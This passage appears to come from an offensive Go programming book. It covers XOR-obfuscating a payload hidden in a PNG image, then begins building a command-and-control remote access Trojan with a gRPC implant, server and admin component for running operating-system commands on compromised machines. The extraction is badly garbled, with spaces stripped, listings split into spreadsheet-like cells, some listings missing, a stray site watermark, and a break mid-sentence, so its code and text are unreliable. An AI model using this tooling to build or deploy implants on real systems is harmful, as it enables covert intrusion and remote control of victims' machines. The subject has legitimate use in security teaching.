bitsinthedatatothebitsofasecretkey.Whentwovalues ,NA,NA
"match,youchangethebitinthepayloadto0,andwhenthey ",NA,NA
"differ,youchangeitto1.Let’sexpandthecodeyoucreatedin ",NA,NA
theprevioussectiontoincludean,encodeDecode(),NA
"function,along",NA,NA
with,XorEncode(),NA
and,XorDecode(),NA
functions.We’llinsertthese,NA,NA
functionsintothe,utils,NA
package(,NA,NA
Listing13-16,NA,NA
).,"funcencodeDecode(input[]byte❶,keystring❷)[]byte
 {
  
 ❸varbArr=make([]byte,len(input)) 
  
 fori:=0;i<len(input);i++{
  
   
 ❹bArr[i]+=input[i]^key[i%len(key)] 
  
 }
  
  
 returnbArr
  
  
 }
  
 Listing13-16:The
 encodeDecode()
 function(
 /ch-13/imgInject/utils/encoders.go
 )",NA
The,encodeDecode(),NA
functionconsumesabyteslicecontaining ,NA,NA
thepayload❶andasecretkeyvalue❷asarguments.Anew ,NA,NA
"byteslice,",bArr,NA
"❸,iscreatedwithinthefunction’sinnerscope ",NA,NA
andinitializedtotheinputbytelengthvalue(thelengthofthe ,NA,NA
"payload).Next,thefunctionusesaconditionallooptoiterate ",NA,NA
overeachindexpositionofinputbytearray.,NA,NA
"Withintheinnerconditionalloop,eachiterationXORsthe ",NA,NA
currentindex’sbinaryvaluewithabinaryvaluederivedfrom ,NA,NA
themoduloofthecurrentindexvalueandlengthofthesecret ,NA,NA
key❹.Thisallowsyoutouseakeythatisshorterthanyour ,NA,NA
"payload.Whentheendofthekeyisreached,themodulowill",NA,NA
forcethenextiterationtousethefirstbyteofthekey.Each ,NA,NA
XORoperationresultiswrittentothenew,bArr,NA
"byteslice,and",NA,NA
thefunctionreturnstheresultingslice.,NA,NA
Thefunctionsin,NA,NA
Listing13-17,NA,NA
wrapthe,encodeDecode(),NA
functiontofacilitatetheencodinganddecodingprocess.,"//XorEncodereturnsencodedbytearray
  
 ❶funcXorEncode(decode[]byte,keystring)[]byte{
  
 ❷returnencodeDecode(decode,key) 
  
 }
  
  
 //XorDecodereturnsdecodedbytearray
  
 ❶funcXorDecode(encode[]byte,keystring)[]byte{
  
 ❷returnencodeDecode(encode,key) 
  
 }
  
 Listing13-17:The
 XorEncode()
 and
 XorDecode()
 functions(
 /ch-
 13/imgInject/utils/encoders.go
 )",NA
"Youdefinetwofunctions,",XorEncode(),NA
and,XorDecode(),NA
",which ",NA,NA
takethesameliteralarguments❶andreturnthesamevalues,NA,NA
❷.That’sbecauseyoudecodeXOR-encodeddatabyusing ,NA,NA
"thesameprocessusedtoencodethedata.However,you ",NA,NA
"definethesefunctionsseparately,toprovideclaritywithinth",NA,NA
e programcode.,NA,NA
"TousetheseXORfunctionsinyourexistingprogram, ",NA,NA
you’llhavetomodifythe,ProcessImage(),NA
logicyoucreatedin,NA,NA
Listing13-8,NA,NA
.Theseupdateswillleveragethe,XorEncode(),NA
"functiontoencryptthepayload.Themodifications,shownin ",NA,NA
Listing13-,NA,NA
18,NA,NA
",assumeyou’reusingcommandlinearguments ",NA,NA
topassvaluestoconditionalencodeanddecodelogic.,"//EncodeBlock
  
  
 if(c.Offset!="""")&&c.Encode{",NA
Thefunctioncallto,XorEncode(),NA
❶passesa,byte,NA
slice ,NA,NA
"containingthepayloadandsecretkey,XORsthetwovalues, ",NA,NA
"andreturnsabyteslice,whichisassignedto",chk.Data,NA
.The,NA,NA
remainingfunctionalityremainsunchangedandmarshalsth,NA,NA
e newchunksegmenttoeventuallybewrittentoanimagefile.,NA,NA
Thecommandlinerunofyourprogramshouldproducea ,NA,NA
resultsimilartotheonein,NA,NA
Listing13-19,NA,NA
.,"$gorunmain.go-iimages/battlecat.png--inject--offset0x85258--encode\
  
  
 --keygophers--payload1234243525522552522452355525--output
  
  
 encodePNGfile
  
  
 ValidPNGsoletuscontinue!
  
 ❶PayloadOriginal:31323334323433353235353232353532353232 
 343532333535353235
  
 ❷PayloadEncode:565D435C574640525D455D574046525D455A57 46
  
  
 46555C455D504046
  
  
 Success:encodePNGfilecreated
  
 Listing13-19:Runningthe
 imgInject
 programtoXORencodeadatachunkblock",NA
The,payload,NA
iswrittentoabyterepresentationanddisplayed,NA,NA
tostdoutas,PayloadOriginal,NA
❶.The,payload,NA
isthenXORedwitha ,key,NA
valueof,gophers,NA
anddisplayedtostdoutas,PayloadEncode,NA
❷.,NA,NA
"Todecryptyourpayloadbytes,youusethedecode",NA,NA
"function,asin",NA,NA
Listing13-20,NA,NA
.,"//DecodeBlock
  
 if(c.Offset!="""")&&c.Decode{
  
 varmMetaChunk
  
  
 ❶offset,_:=strconv.ParseInt(c.Offset,10,64)
  
  
 ❷b.Seek(offset,0)
  
  
 ❸m.readChunk(b) 
  
 origData:=m.Chk.Data
  
  
 ❹m.Chk.Data=utils.XorDecode(m.Chk.Data,c.Key) 
 m.Chk.CRC=m.createChunkCRC()
  
  
 ❺bm:=m.marshalData() 
  
 bmb:=bm.Bytes()
  
 fmt.Printf(""PayloadOriginal:%X\n"",origData)
  
 fmt.Printf(""PayloadDecode:%X\n"",m.Chk.Data)
  
 ❻utils.WriteData(b,c,bmb) 
  
 }
  
 Listing13-20:Decodingtheimagefileandpayload(
 /ch-
  
 13/imgInject/pnglib/commands.go
 )",NA
Theblockrequirestheoffsetpositionofthechunksegment ,NA,NA
thatcontainsthepayload❶.Youusetheoffsetto,Seek(),NA
❷the ,NA,NA
"fileposition,alongwithasubsequentcallto",readChunk(),NA
❸that’s,NA,NA
necessarytoderivethe,SIZE,NA
",",TYPE,NA
",",DATA,NA
",and",CRC,NA
values. ,NA,NA
Acallto,XorDecode(),NA
❹takesthe,chk.Data,NA
payloadvalueandthe ,NA,NA
"samesecretkeyusedtoencodethedata,andthenassignsthe",NA,NA
decodedpayloadvaluebackto,chk.Data,NA
.(Rememberthatthisis,NA,NA
"symmetricencryption,soyouusethesamekeytobothencrypt",NA,NA
anddecryptthedata.)Thecodeblockcontinuesbycalling ,marshalData(),NA
"❺,whichconvertsyour",Chunk,NA
structtoa,byte,NA
slice.,NA,NA
"Finally,youwritethenewchunksegmentcontainingthe",NA,NA
decodedpayloadtoafilebyusingthe,WriteData(),NA
function❻.,NA,NA
"Acommandlinerunofyourprogram,thistimewitha ",NA,NA
"decodeargument,shouldproducetheresultin",NA,NA
Listing13-21,NA,NA
.,"$
 gorunmain.go-iencodePNGfile-odecodePNGfile--offset0x85258-
  
  
 decode\
  
  
 --keygophersValidPNGsoletuscontinue!
  
 ❶PayloadOriginal:565D435C574640525D455D574046525D455A57 
 4646555C455D504046
  
 ❷PayloadDecode:3132333432343335323535323235353235323234 
 3532333535353235
  
  
 Success:decodePNGfilecreated
  
 Listing13-21:Runningthe
 imgInject
 programtoXORdecodeadatachunkblock",NA
The,PayloadOriginal,NA
value❶istheencodedpayloaddataread ,NA,NA
"fromtheoriginalPNGfile,whilethe",PayloadDecode,NA
value❷is ,NA,NA
thedecryptedpayload.Ifyoucompareyoursamplecommand ,NA,NA
"linerunfrombeforeandtheoutputhere,you’llnoticethat ",NA,NA
"yourdecodedpayloadmatchestheoriginal,cleartextvalue ",NA,NA
yousuppliedoriginally.,NA,NA
"Thereisaproblemwiththecode,though.Recallthatthe ",NA,NA
programcodeinjectsyournewdecodedchunkatanoffset ,NA,NA
positionofyourspecification.Ifyouhaveafilethatalready ,NA,NA
containstheencodedchunksegmentandthenattempttowrite ,NA,NA
"anewfilewithadecodedchunksegment,you’llendupwith ",NA,NA
bothchunksinthenewoutputfile.Youcanseethisin,NA,NA
Figure 13-,NA,NA
5,NA,NA
.,NA,NA
"Tounderstandwhythishappens,recallthattheencoded ",NA,NA
PNGfilehastheencodedchunksegmentatoffset,0x85258,NA
",as",NA,NA
shownin,NA,NA
Figure13-6,NA,NA
.,Figure13-6:Theoutputfilecontainingtheencodedchunksegment,NA
Theproblempresentsitselfwhenthedecodeddatais ,NA,NA
writtentooffset,0x85258,NA
.Whenthedecodeddatagetswrittento,NA,NA
"thesamelocationastheencodeddata,ourimplementation ",NA,NA
doesn’tdeletetheencodeddata;itmerelyshiftstheremainder ,NA,NA
"ofthefilebytestotheright,includingtheencodedchunk ",NA,NA
"segment,asillustratedpreviouslyin",NA,NA
Figure13-5,NA,NA
.Thiscan ,NA,NA
complicatepayloadextractionorproduceunintended ,NA,NA
"consequences,suchasrevealingthecleartextpayloadto ",NA,NA
networkdevicesorsecuritysoftware.,NA,NA
"Fortunately,thisissueisquiteeasytoresolve.Let’stakea ",NA,NA
lookatourprevious,WriteData(),NA
"function.Thistime,youcan",NA,NA
modifyittoaddresstheproblem(,NA,NA
Listing13-22,NA,NA
).,HivaNetwork.Com,NA
Youintroducethefixwiththe,c.Decode,NA
conditionallogic❶.,NA,NA
TheXORoperationproducesabyte-for-bytetransaction.,NA,NA
"Therefore,theencodedanddecodedchunksegmentsare ",NA,NA
"identicalinlength.Furthermore,the",bytes.Reader,NA
willcontainthe,NA,NA
remainderoftheoriginalencodedimagefileatthemoment ,NA,NA
"thedecodedchunksegmentiswritten.So,youcanperforma ",NA,NA
rightbyteshiftcomprisingthelengthofthedecodedchunk ,NA,NA
segmentonthe,bytes.Reader,NA
"❷,advancingthe",bytes.Reader,NA
pastthe,NA,NA
encodedchunksegmentandwritingtheremainderofbytesto ,NA,NA
yournewimagefile❸.,NA,NA
Voila!Asyoucanseein,NA,NA
Figure13-7,NA,NA
",thehexeditor ",NA,NA
confirmsthatyouresolvedtheproblem.Nomoreduplicate ,NA,NA
ancillarychunktypes.,Figure13-7:Theoutputfilewithoutduplicateancillarydata,NA
"Theencodeddatanolongerexists.Additionally,running","ls
  
 -la",NA
"againstthefilesshouldproduceidenticalfilelengths,even",NA,NA
thoughfilebyteshavechanged.,NA,NA
SUMMARY,NA,NA
"Inthischapter,youlearnedhowtodescribethePNGimage ",NA,NA
"fileformatasaseriesofrepetitivebytechunksegments,each ",NA,NA
"withitsrespectivepurposeandapplicability.Next,you ",NA,NA
learnedmethodsofreadingandnavigatingthebinaryfile.,NA,NA
Thenyoucreatedbytedataandwroteittoanimagefile. ,NA,NA
"Finally,youusedXORencodingtoobfuscateyourpayload.",NA,NA
Thischapterfocusedonimagefilesandonlyscratchedthe ,NA,NA
surfaceofwhatyoucanaccomplishbyusingsteganography ,NA,NA
techniques.Butyoushouldbeabletoapplywhatyoulearned ,NA,NA
heretoexploreotherbinaryfiletypes.,NA,NA
ADDITIONALEXERCISES,NA,NA
"Likemanyoftheotherchaptersinthisbook,thischapterwill",NA,NA
providethemostvalueifyouactuallycodeandexperiment ,NA,NA
"alongtheway.Therefore,wewanttoconcludewithafew ",NA,NA
challengestoexpandontheideasalreadycovered:,"1.
  WhilereadingtheXORsection,youmayhavenoticedthattheXorDecode() 
 functionproducesadecodedchunksegment,butneverupdatestheCRC 
 checksum.Seeifyoucancorrectthisissue.
  
 2.
  TheWriteData()functionfacilitatestheabilitytoinjectarbitrarychunk 
 segments.Whatcodechangeswouldyouhavetomakeifyouwantedto 
 overwriteexistingancillarychunksegments?Ifyouneedhelp,ourexplanation 
 aboutbyteshiftingandtheSeek()functionmaybeusefulinsolvingthis 
 problem.
  
 3.
  Here’samorechallengingproblem:trytoinjectapayload—thePNGDATA 
 bytechunk—bydistributingitthroughoutvariousancillarychunksegments. 
 Youcoulddothisonebyteatatime,orwithmultiplegroupingsofbytes,soget 
 creative.Asanaddedbonus,createadecoderthatreadsexactpayloadbyte 
 offsetlocations,makingiteasiertoextractthepayload.
  
 4.
  ThechapterexplainedhowtouseXORasaconfidentialitytechnique—a 
 methodtoobfuscatetheimplantedpayload.Trytoimplementadifferent 
 technique,suchasAESencryption.Gocorepackagesprovideanumberof 
 possibilities(see
 Chapter11
 ifyouneedarefresher).Observehowthesolution 
 affectsthenewimage.Doesitcausetheoverallsizetoincrease,andifso,by 
 howmuch?
  
 5.
  Usethecodeideaswithinthischaptertoexpandsupportforotherimagefile 
 formats.OtherimagespecificationsmaynotbeasorganizedasPNG.Want 
 proof?GivethePDFspecificationaread,asitcanberatherintimidating.How 
 wouldyousolvethechallengesofreadingandwritingdatatothisnewimage 
 format?",NA
14 ,NA,NA
BUILDINGACOMMAND-AND-,NA,NA
CONTROLRAT,NA,NA
"Inthischapter,we’lltietogetherseverallessonsfromthe ",NA,NA
previouschapterstobuildabasiccommandandcontrol(C2) ,NA,NA
remoteaccessTrojan,NA,NA
(,NA,NA
RAT,NA,NA
).ARATisatoolusedby ,NA,NA
attackerstoremotelyperformactionsonacompromised ,NA,NA
"victim’smachine,suchasaccessingthefilesystem,executing ",NA,NA
"code,andsniffingnetworktraffic.",NA,NA
BuildingthisRATrequiresbuildingthreeseparatetools:a ,NA,NA
"clientimplant,aserver,andanadmincomponent.Theclient ",NA,NA
implantistheportionoftheRATthatrunsonacompromised ,NA,NA
workstation.Theserveriswhatwillinteractwiththeclient ,NA,NA
"implant,muchlikethewayCobaltStrike’steamserver—the ",NA,NA
servercomponentofthewidelyusedC2tool—sends ,NA,NA
"commandstocompromisedsystems.Unliketheteamserver, ",NA,NA
whichusesasingleservicetofacilitateserverand ,NA,NA
"administrativefunctions,we’llcreateaseparate,stand-alone ",NA,NA
admincomponentusedtoactuallyissuethecommands.This ,NA,NA
"serverwillactasthemiddleman,choreographing",NA,NA
communicationsbetweencompromisedsystemsandt,NA,NA
he attackerinteractingwiththeadmincomponent.,NA,NA
ThereareaninfinitenumberofwaystodesignaRAT.In ,NA,NA
"thischapter,weaimtohighlighthowtohandleclientand ",NA,NA
"servercommunicationsforremoteaccess.Forthisreason, ",NA,NA
we’llshowyouhowtobuildsomethingsimpleand ,NA,NA
"unpolished,andthenpromptyoutocreatesignificant ",NA,NA
improvementsthatshouldmakeyourspecificversionmore ,NA,NA
"robust.Theseimprovements,inmanycases,willrequireyou ",NA,NA
toreusecontentandcodeexamplesfrompreviouschapters. ,NA,NA
"You’llapplyyourknowledge,creativity,andproblem-solving ",NA,NA
abilitytoenhanceyourimplementation.,NA,NA
GETTINGSTARTED,NA,NA
"Togetstarted,let’sreviewwhatwe’regoingtodo:we’ll ",NA,NA
createaserverthatreceivesworkintheformofoperating ,NA,NA
systemcommandsfromanadmincomponent(whichwe’ll ,NA,NA
alsocreate).We’llcreateanimplantthatpollstheserver ,NA,NA
periodicallytolookfornewcommandsandthenpublishesthe ,NA,NA
commandoutputbackontotheserver.Theserverwillthen ,NA,NA
handthatresultbacktotheadministrativeclientsothatthe ,NA,NA
operator(you)canseetheoutput.,NA,NA
Let’sstartbyinstallingatoolthatwillhelpushandleall ,NA,NA
thesenetworkinteractionsandreviewingthedirectory ,NA,NA
structureforthisproject.,NA,NA
InstallingProtocolBuffersforDefiningagRPCAPI,NA,NA
We’llbuildallthenetworkinteractionsbyusing,NA,NA
gRPC,NA,NA
",a ",NA,NA
high-,NA,NA
performanceremoteprocedurecall(RPC)framework,NA,NA
createdbyGoogle.RPCframeworksallowclientsto ,NA,NA
communicatewithserversoverstandardanddefinedprotoco,NA,NA
ls withouthavingtounderstandanyoftheunderlyingdetails. ,NA,NA
"ThegRPCframeworkoperatesoverHTTP/2,communicating ",NA,NA
"messagesinahighlyefficient,binarystructure.",NA,NA
"MuchlikeotherRPCmechanisms,suchasRESTor ",NA,NA
"SOAP,ourdatastructuresneedtobedefinedinordertomake ",NA,NA
"themeasytoserializeanddeserialize.Luckilyforus,there’sa ",NA,NA
mechanismfordefiningourdataandAPIfunctionssowecan ,NA,NA
"usethemwithgRPC.Thismechanism,ProtocolBuffers(or ",NA,NA
"Protobuf,forshort),includesastandardsyntaxforAPIand ",NA,NA
complexdatadefinitionsintheformofa,NA,NA
.proto,NA,NA
file.Tooling ,NA,NA
existstocompilethatdefinitionfileintoGo-friendlyinterface ,NA,NA
"stubsanddatatypes.Infact,thistoolingcanproduceoutputin ",NA,NA
"avarietyoflanguages,meaningyoucanusethe",NA,NA
.proto,NA,NA
fileto ,NA,NA
generateC#stubsandtypes.,NA,NA
YourfirstorderofbusinessistoinstalltheProtobuf ,NA,NA
compileronyoursystem.Walkingthroughtheinstallationis ,NA,NA
"outsidethescopeofthisbook,butyou’llfindfulldetailsunder ",NA,NA
the“Installation”sectionoftheofficialGoProtobufrepository ,NA,NA
at,NA,NA
https://github.com/golang/protobuf/,NA,NA
".Also,whileyou’reat ",NA,NA
"it,installthegRPCpackagewiththefollowingcommand:",">
 goget-ugoogle.golang.org/grpc",NA
CreatingtheProjectWorkspace,NA,NA
"Next,let’screateourprojectworkspace.We’llcreatefour ",NA,NA
subdirectoriestoaccountforthethreecomponents(the ,NA,NA
"implant,server,andadmincomponent)andthegRPCAPI ",NA,NA
"definitionfiles.Ineachofthecomponentdirectories,we’ll ",NA,NA
createasingleGofile(ofthesamenameastheencompassing,NA,NA
directory)that’llbelongtoitsown,main,NA
package.Thisletsus,NA,NA
independentlycompileandruneachasastand-alone ,NA,NA
componentandwillcreateadescriptivebinarynameinthe ,NA,NA
eventwerun,gobuild,NA
onthecomponent.We’llalsocreateafile,NA,NA
named,NA,NA
implant.proto,NA,NA
inour,NA,NA
grpcapi,NA,NA
directory.Thatfilewill ,NA,NA
holdourProtobufschemaandgRPCAPIdefinitions.Here’s ,NA,NA
thedirectorystructureyoushouldhave:,"$
 tree
  
  
 .
  
  
 |--client
  
  
 ||--client.go
  
  
 |--grpcapi
  
  
 ||--implant.proto
  
  
 |--implant
  
  
 ||--implant.go
  
  
 |--server
  
  
 |--server.go",NA
"Withthestructurecreated,wecanbeginbuildingour ",NA,NA
"implementation.Throughoutthenextseveralsections,we’l",NA,NA
l walkyouthroughthecontentsofeachfile.,NA,NA
DEFININGANDBUILDINGTHE ,NA,NA
GRPCAPI,NA,NA
Thenextorderofbusinessistodefinethefunctionalityand ,NA,NA
dataourgRPCAPIwilluse.Unlikebuildingandconsuming ,NA,NA
"RESTendpoints,whichhaveafairlywell-definedsetof ",NA,NA
"expectations(forexample,theyuseHTTPverbsandURL ",NA,NA
"pathstodefinewhichactiontotakeonwhichdata),gRPCis ",NA,NA
morearbitrary.YoueffectivelydefineanAPIserviceandtie ,NA,NA
toitthefunctionprototypesanddatatypesforthatservice.,NA,NA
We’lluseProtobufstodefineourAPI.Youcanfindafull ,NA,NA
explanationoftheProtobufsyntaxwithaquickGoogle ,NA,NA
"search,butwe’llbrieflyexplainithere.",NA,NA
"Ataminimum,we’llneedtodefineanadministrative ",NA,NA
serviceusedbyoperatorstosendoperatingsystemcommands ,NA,NA
(work)totheserver.We’llalsoneedanimplantserviceused ,NA,NA
byourimplanttofetchworkfromtheserverandsendthe ,NA,NA
commandoutputbacktotheserver.,NA,NA
Listing14-1,NA,NA
showsthe ,NA,NA
contentsofthe,NA,NA
implant.proto,NA,NA
file.(Allthecodelistingsatthe ,NA,NA
rootlocationof/existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.),"//implant.proto
  
  
 syntax=""proto3"";
  
 ❶packagegrpcapi;
  
  
 //ImplantdefinesourC2APIfunctions
  
 ❷serviceImplant{ 
  
 rpcFetchCommand(Empty)returns(Command);
  
 rpcSendOutput(Command)returns(Empty); 
  
 }
  
 //AdmindefinesourAdminAPIfunctions
  
 ❸serviceAdmin{ 
  
 rpcRunCommand(Command)returns(Command);
  
 }
  
 //Commanddefinesawithbothinputandoutputfields
 ❹messageCommand{ 
  
 stringIn=1;
  
 stringOut=2; 
  
 }
  
 //Emptydefinesanemptymessageusedinplaceofnull❺
 messageEmpty{ 
  
 }",NA
Recallhowweintendtocompilethisdefinitionfileinto Go-,NA,NA
"specificartifacts?Well,weexplicitlyinclude",packagegrpcapi,NA
❶toi,NA,NA
nstructthecompilerthatwewanttheseartifactscreated ,NA,NA
underthe,grpcapi,NA
package.Thenameofthispackageis ,NA,NA
arbitrary.WepickedittoensurethattheAPIcoderemains ,NA,NA
separatefromtheothercomponents.,NA,NA
Ourschemathendefinesaservicenamed,Implant,NA
anda ,NA,NA
servicenamed,Admin,NA
.We’reseparatingthesebecausewe ,NA,NA
expectour,Implant,NA
componenttointeractwithourAPIina ,NA,NA
differentmannerthanour,Admin,NA
"client.Forexample,we ",NA,NA
wouldn’twantour,Implant,NA
sendingoperatingsystemcomman,NA,NA
"d worktoourserver,justaswedon’twanttorequireour",Admin,NA
componenttosendcommandoutputtotheserver.,NA,NA
Wedefinetwomethodsonthe,Implant,NA
service:,FetchCommand,NA
and,SendOutput,NA
❷.Definingthesemethodsislikedefiningan ,interface,NA
inGo.We’resayingthatanyimplementationofthe ,Implant,NA
servicewillneedtoimplementthosetwomethods. ,FetchCommand,NA
",whichtakesan",Empty,NA
messageasaparameterand ,NA,NA
returnsa,Command,NA
"message,willretrieveanyoutstanding ",NA,NA
operatingsystemcommandsfromtheserver.,SendOutput,NA
will ,NA,NA
senda,Command,NA
message(whichcontainscommandoutput) ,NA,NA
"backtotheserver.Thesemessages,whichwe’llcover ",NA,NA
"momentarily,arearbitrary,complexdatastructuresthat ",NA,NA
containfieldsnecessaryforustopassdatabackandforth ,NA,NA
betweenourendpoints.,NA,NA
Our,Admin,NA
servicedefinesasinglemethod:,RunCommand,NA
", ",NA,NA
whichtakesa,Command,NA
messageasaparameterandexpectsto,NA,NA
reada,Command,NA
"messageback❸.Itsintentionistoallowyou, ",NA,NA
"theRAToperator,torunanoperatingsystemcommandona ",NA,NA
remotesystemthathasarunningimplant.,NA,NA
"Lastly,wedefinethetwomessageswe’llbepassing ",NA,NA
around:,Command,NA
and,Empty,NA
.The,Command,NA
messagecontainstwo,NA,NA
"fields,oneusedformaintainingtheoperatingsystem ",NA,NA
commanditself(astringnamed,In,NA
)andoneusedfor ,NA,NA
maintainingthecommandoutput(astringnamed,Out,NA
)❹.Note ,NA,NA
"thatthemessageandfieldnamesarearbitrary,butthatwe ",NA,NA
assigneachfieldanumericalvalue.Youmightbewondering ,NA,NA
howwecanassign,In,NA
and,Out,NA
numericalvaluesifwedefined,NA,NA
themtobestrings.Theansweristhatthisisaschema ,NA,NA
"definition,notanimplementation.Thosenumericalvalues ",NA,NA
representtheoffsetwithinthemessageitselfwherethose ,NA,NA
fieldswillappear.We’resaying,In,NA
"willappearfirst,and",Out,NA
willappearsecond.The,Empty,NA
messagecontainsnofields❺. ,NA,NA
ThisisahacktoworkaroundthefactthatProtobufdoesn’t ,NA,NA
explicitlyallownullvaluestobepassedintoorreturnedfrom ,NA,NA
anRPCmethod.,NA,NA
"Nowwehaveourschema.TowrapupthegRPCdefinition, ",NA,NA
weneedtocompiletheschema.Runthefollowingcommand ,NA,NA
fromthe,NA,NA
grpcapi,NA,NA
directory:,">
 protoc-I.implant.proto--go_out=plugins=grpc:./",NA
"Thiscommand,whichisavailableafteryoucompletethe ",NA,NA
"initialinstallationwementionedearlier,searchesthecurrent ",NA,NA
directoryfortheProtobuffilenamed,NA,NA
implant.proto,NA,NA
and ,NA,NA
producesGo-specificoutputinthecurrentdirectory.Onceyou ,NA,NA
"executeitsuccessfully,youshouldhaveanewfilenamed",HivaNetwork.Com,NA
implant.pb.go,NA,NA
inyour,NA,NA
grpcapi,NA,NA
directory.Thisnewfilecontains ,NA,NA
the,interface,NA
and,struct,NA
definitionsfortheservicesandmessages,NA,NA
createdintheProtobufschema.We’llleveragethisfor ,NA,NA
"buildingourserver,implant,andadmincomponent.Let’s ",NA,NA
buildtheseonebyone.,NA,NA
CREATINGTHESERVER,NA,NA
"Let’sstartwiththeserver,whichwillacceptcommandsfrom ",NA,NA
theadminclientandpollingfromtheimplant.Theserverwill ,NA,NA
"bethemostcomplicatedofthecomponents,sinceit’llneedto ",NA,NA
implementboththe,Implant,NA
and,Admin,NA
"services.Plus,sinceit’s",NA,NA
actingasamiddlemanbetweentheadmincomponentand ,NA,NA
"implant,it’llneedtoproxyandmanagemessagescomingto ",NA,NA
andfromeachside.,NA,NA
ImplementingtheProtocolInterface,NA,NA
Let’sfirstlookatthegutsofourserverin,NA,NA
server/server.go ,NA,NA
(,NA,NA
Listing14-2,NA,NA
").Here,we’reimplementingtheinterface ",NA,NA
methodsnecessaryfortheservertoreadandwritecommand,NA,NA
s fromandtosharedchannels.,"❶typeimplantServerstruct{ 
  
 work,outputchan*grpcapi.Command
  
 } 
  
 typeadminServerstruct{ 
  
 work,outputchan*grpcapi.Command 
  
 }
  
 ❷funcNewImplantServer(work,outputchan*grpcapi.Command)*implantServe
 r {
  
 s:=new(implantServer) 
  
 s.work=work
  
 s.output=output",NA
"ToserveouradminandimplantAPIs,weneedtodefine ",NA,NA
servertypesthatimplementallthenecessaryinterface ,NA,NA
methods.Thisistheonlywaywecanstartan,Implant,NA
or,Admin,NA
"service.Thatis,we’llneedtohavethe","FetchCommand(ctx
  
 context.Context,empty*grpcapi.Empty)",NA
",","SendOutput(ctxcontext.Context,result
  
 *grpcapi.Command)",NA
",and","RunCommand(ctxcontext.Context,cmd
  
 *grpcapi.Command)",NA
methodsproperlydefined.Tokeepour,NA,NA
"implantandadminAPIsmutuallyexclusive,we’llimplement ",NA,NA
themasseparatetypes.,NA,NA
"First,wecreateour",structs,NA
",named",implantServer,NA
and,adminServer,NA
", ",NA,NA
that’llimplementthenecessarymethods❶.Eachtype ,NA,NA
"containsidenticalfields:twochannels,usedforsendingand ",NA,NA
receivingworkandcommandoutput.Thisisaprettysimple ,NA,NA
wayforourserverstoproxythecommandsandtheir ,NA,NA
responsesbetweentheadminandimplantcomponents.,NA,NA
"Next,wedefineacoupleofhelperfunctions, ","NewImplantServer(work,outputchan*grpcapi.Command)",NA
an,NA,NA
d,"NewAdminServer(work,outputchan*grpcapi.Command)",NA
",thatcreatene",NA,NA
w ,implantServer,NA
and,adminServer,NA
instances❷.Theseexistsolelyto ,NA,NA
makesurethechannelsareproperlyinitialized.,NA,NA
Nowcomestheinterestingpart:theimplementationofou,NA,NA
r gRPCmethods.Youmightnoticethatthemethodsdon’t ,NA,NA
"exactlymatchtheProtobufschema.Forexample,we’re ",NA,NA
receivinga,context.Context,NA
parameterineachmethodand,NA,NA
returningan,error,NA
.The,protoc,NA
commandyouranearlierto,NA,NA
compileyourschemaaddedthesetoeachinterfacemethod,NA,NA
definitioninthegeneratedfile.Thisletsusmanagerequest ,NA,NA
contextandreturnerrors.Thisisprettystandardstuffformost ,NA,NA
networkcommunications.Thecompilersparedusfromhavin,NA,NA
g toexplicitlyrequirethatinourschemafile.,NA,NA
Thefirstmethodweimplementonour,implantServer,NA
", ","FetchCommand(ctxcontext.Context,empty*grpcapi.Empty)",NA
",receivesa ",*grpcapi.Empty,NA
andreturnsa,*grpcapi.Command,NA
❸.Recallthatwe ,NA,NA
definedthis,Empty,NA
typebecausegRPCdoesn’tallownullvalues ,NA,NA
explicitly.Wedon’tneedtoreceiveanyinputsincetheclient ,NA,NA
implantwillcallthe,"FetchCommand(ctxcontext.Context,empty*grpcapi 
 .Empty)",NA
"methodassortofapollingmechanismthatasks,“Hey, ",NA,NA
doyouhaveworkforme?”Themethod’slogicisabitmore ,NA,NA
"complicated,sincewecansendworktotheimplantonlyifwe ",NA,NA
"actuallyhaveworktosend.So,weusea",select,NA
statement❹on ,NA,NA
the,work,NA
channeltodeterminewhetherwedohavework.,NA,NA
Readingfromachannelinthismanneris,NA,NA
nonblocking,NA,NA
", ",NA,NA
meaningthatexecutionwillrunour,default,NA
caseifthere’s ,NA,NA
"nothingtoreadfromthechannel.Thisisideal,sincewe’ll ",NA,NA
haveourimplantcalling,"FetchCommand(ctxcontext.Context,empty 
 *grpcapi.Empty)",NA
onaperiodicbasisasawaytogetworkona near-,NA,NA
real-timeschedule.Intheeventthatwedohaveworkin ,NA,NA
"thechannel,wereturnthecommand.Behindthescenes,the ",NA,NA
commandwillbeserializedandsentoverthenetworkbackto ,NA,NA
theimplant.,NA,NA
Thesecond,implantServer,NA
"method,","SendOutput(ctxcontext.Context, 
 result*grpcapi.Command)",NA
",pushesthereceived",*grpcapi.Command,NA
onto ,NA,NA
the,output,NA
channel❺.Recallthatwedefinedour,Command,NA
to ,NA,NA
"havenotonlyastringfieldforthecommandtorun,butalsoa ",NA,NA
fieldtoholdthecommand’soutput.Sincethe,Command,NA
we’re,NA,NA
receivinghastheoutputfieldpopulatedwiththeresultofa ,NA,NA
command(asrunbytheimplant)the,"SendOutput(ctxcontext.Context,
  
 result*grpcapi.Command)",NA
methodsimplytakesthatresultfromthe,NA,NA
implantandputsitontoachannelthatouradmincomponent ,NA,NA
willreadfromlater.,NA,NA
Thelast,implantServer,NA
"method,","RunCommand(ctxcontext.Context,cmd
  
 *grpcapi.Command)",NA
",isdefinedonthe",adminServer,NA
type.Itreceivesa ,Command,NA
thathasnotyetbeensenttotheimplant❻.It ,NA,NA
representsaunitofworkouradmincomponentwantsour ,NA,NA
implanttoexecute.Weuseagoroutinetoplaceourworkon ,NA,NA
the,work,NA
"channel.Aswe’reusinganunbufferedchannel,this",NA,NA
actionblocksexecution.Weneedtobeabletoreadfromthe ,NA,NA
"outputchannel,though,soweuseagoroutinetoputworkon ",NA,NA
"thechannelandcontinueexecution.Executionblocks,waiting ",NA,NA
foraresponseonour,output,NA
channel.We’veessentiallymade,NA,NA
thisflowasynchronoussetofsteps:sendacommandtoan ,NA,NA
implantandwaitforaresponse.Whenwereceivethe ,NA,NA
"response,wereturntheresult.Again,weexpectthisresult,a ",Command,NA
",tohaveitsoutputfieldpopulatedwiththeresultof",NA,NA
theoperatingsystemcommandexecutedbytheimplant.,NA,NA
Writingthemain()Function,NA,NA
Listing14-3,NA,NA
showsthe,NA,NA
server/server.go,NA,NA
file’s,main(),NA
"function,",NA,NA
whichrunstwoseparateservers—onetoreceivecommands ,NA,NA
fromtheadminclientandtheothertoreceivepollingfromthe ,NA,NA
implant.Wehavetwolistenerssothatwecanrestrictaccessto ,NA,NA
ouradminAPI—,NA,NA
